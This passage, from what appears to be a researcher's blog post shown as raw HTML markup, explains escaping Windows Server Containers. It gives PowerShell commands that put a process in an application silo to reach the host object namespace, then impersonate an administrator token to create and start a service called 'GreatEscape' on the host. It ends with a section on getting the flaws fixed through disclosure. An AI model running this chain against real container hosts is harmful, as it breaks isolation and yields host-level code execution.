 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;c38 lst-kix_xgd2a7n379wd-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c3 c25 li-bullet-0&quot;&gt;&lt;span class=&quot;c11&quot;&gt;Create an application silo.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c3 c25 li-bullet-0&quot;&gt;&lt;span class=&quot;c11&quot;&gt;Assign it to a process.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c3 c25 li-bullet-0&quot;&gt;&lt;span class=&quot;c11&quot;&gt;Fully access the root of the object manager namespace.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;This is basically a more powerful version of the global symlink vulnerability but requires no administrator privileges to function. Again, as with the registry issue you&amp;rsquo;re still limited in what you can modify outside of the containers based on the token in the container. But you can read files on disk, or interact with ALPC ports on the host system.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;The exploit in PowerShell is pretty straightforward using my toolchain:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.9f53c9246a6d008ba56f25c9d969ab14d33b9b5f&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.12&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c20&quot;&gt;$root&lt;/span&gt;&lt;span class=&quot;c8&quot;&gt;&amp;nbsp;= &lt;/span&gt;&lt;span class=&quot;c8 c37&quot;&gt;Get-NtDirectory&lt;/span&gt;&lt;span class=&quot;c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c36&quot;&gt;&amp;quot;\&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c20&quot;&gt;$root&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;.FullPath&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;\&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c4 c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$silo&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;New-NtJob&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-CreateSilo&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-NoSiloRootDirectory&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Set-NtProcessJob&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$silo&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-Current&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c36&quot;&gt;$root&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;.FullPath&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;\Silos\748&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;To test the exploit we first open the current root directory object and then print its full path as the kernel sees it. Even though the silo root isn&amp;rsquo;t really a root directory the kernel makes it look like it is by returning a single backslash as the path.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;We then create the application silo using the New-NtJob command. You need to specify &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;NoSiloRootDirectory &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;to prevent the code trying to create a root directory which we don&amp;rsquo;t want and can&amp;rsquo;t be done from a non-administrator account anyway. We can then assign the application silo to the process.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Now we can check the root directory path again. We now find the root directory is really called &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;\Silos\748&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;instead of just a single backslash. This is because the kernel is now using the root root directory. At this point you can access resources on the host through the object manager.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;c12&quot; id=&quot;h.7eqr86rbd62k&quot;&gt;&lt;span class=&quot;c22 c34&quot;&gt;Chaining the Exploits&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;We can now combine these issues together to escape the container completely from &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser&lt;/span&gt;&lt;span&gt;. First get hold of an administrator token through something like RogueWinRM, you can then impersonate it due to having &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;. Then you can use the object manager root directory issue to access the host&amp;rsquo;s service control manager (SCM) using the ALPC port to create a new service. You don&amp;rsquo;t even need to copy an executable outside the container as the system volume for the container is an accessible device on the host we can just access.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;As far as the host&amp;rsquo;s SCM is concerned you&amp;rsquo;re an administrator and so it&amp;rsquo;ll grant you full access to create an arbitrary service. However, when that service starts it&amp;rsquo;ll run in the host, not in the container, removing all restrictions. One quirk which can make exploitation unreliable is the SCM&amp;rsquo;s RPC handle can be cached by the Win32 APIs. If any connection is made to the SCM in any part of PowerShell before installing the service you will end up accessing the container&amp;rsquo;s SCM, not the hosts.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;To get around this issue we can just access the RPC service directly using &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;NtObjectManager&amp;rsquo;s &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;RPC commands. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.c232b6e70023543f31524d3a8402d746252215e9&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.13&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$imp&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;= &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;.Impersonate()&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$sym_path&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c36&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$env:SystemDrive&lt;/span&gt;&lt;span class=&quot;c27 c8 c17&quot;&gt;\symbols&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$sym_path&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c0 c33&quot;&gt;Out-Null&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$services_path&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c36&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$env:SystemRoot&lt;/span&gt;&lt;span class=&quot;c8 c17 c27&quot;&gt;\system32\services.exe&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c27 c8 c17&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c27 c8 c17&quot;&gt;&amp;#39;cmd /C echo &amp;quot;Hello World&amp;quot; &amp;gt; \hello.txt&amp;#39;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c27 c8 c17&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c15 c8&quot;&gt;# You can also use the following to run a container based executable.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c15 c8&quot;&gt;#$cmd = Use-NtObject($f = Get-NtFile -Win32Path &amp;quot;demo.exe&amp;quot;) {&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17 c29&quot;&gt;# &amp;nbsp; &amp;quot;&lt;/span&gt;&lt;span class=&quot;c8 c17 c29&quot;&gt;\\.\GLOBALROOT&lt;/span&gt;&lt;span class=&quot;c8 c15&quot;&gt;&amp;quot; + $f.FullPath&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c15 c8&quot;&gt;#}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c15 c8&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Get-Win32ModuleSymbolFile&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$services_path&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-OutPath&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c33 c8 c17 c20&quot;&gt;$sym_path&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$rpc&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Get-RpcServer&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$services_path&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-SymbolPath&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$sym_path&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;c22 c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;&amp;nbsp; &amp;nbsp;Select-RpcServer&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-InterfaceId&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c27 c8 c17&quot;&gt;&amp;#39;367abb81-9844-35f1-ad32-98f038001003&amp;#39;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Get-RpcClient&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c33 c8 c17 c20&quot;&gt;$rpc&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c33 c8 c17 c20&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$silo&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;New-NtJob&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-CreateSilo&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c33 c8 c17 c32&quot;&gt;-NoSiloRootDirectory&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Set-NtProcessJob&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$silo&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32 c33&quot;&gt;-Current&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Connect-RpcClient&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-EndpointPath&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c6 c33&quot;&gt;ntsvcs&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c6 c33&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$scm&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;ROpenSCManagerW(&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c8 c28 c17&quot;&gt;NullString&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c22 c8 c17&quot;&gt;&amp;nbsp;`&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c16&quot;&gt;&amp;nbsp;[&lt;/span&gt;&lt;span class=&quot;c8 c28 c17&quot;&gt;NullString&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;c33 c8 c16&quot;&gt;, `&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c8 c17 c28&quot;&gt;NtApiDotNet.Win32.ServiceControlManagerAccessRights&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;c22 c8 c17&quot;&gt;CreateService)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$service&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;RCreateServiceW(&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$scm&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;p3&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c36&quot;&gt;&amp;quot;GreatEscape&amp;quot;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c36&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;c33 c8 c16&quot;&gt;, `&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c8 c28 c17&quot;&gt;NtApiDotNet.Win32.ServiceAccessRights&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c26&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c26&quot;&gt;0x3&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c26&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;c33 c8 c16&quot;&gt;, `&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c8 c28 c17&quot;&gt;NullString&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$null&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$null&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c26&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c8 c28 c17&quot;&gt;NullString&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$null&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c26&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;c22 c8 c17&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8 c17&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;RStartServiceW(&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$service&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;p15&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c26&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;c8 c16&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c20&quot;&gt;$null&lt;/span&gt;&lt;span class=&quot;c22 c8 c17&quot;&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;For this code to work it&amp;rsquo;s expected you have an administrator token in the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;$token&lt;/span&gt;&lt;span&gt;&amp;nbsp;variable to impersonate. Getting that token is left as an exercise for the reader. When you run it in a container the result should be the file &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;hello.txt&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;written to the root of the host&amp;rsquo;s system drive.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;c12&quot; id=&quot;h.w1ugn9uzehzn&quot;&gt;&lt;span class=&quot;c22 c34&quot;&gt;Getting the Issues Fixed&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;I have some server silo escapes, now what? I would prefer to get them fixed, however as already mentioned MSRC servicing criteria pointed out that Windows Server Containers are not a supported security boundary.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
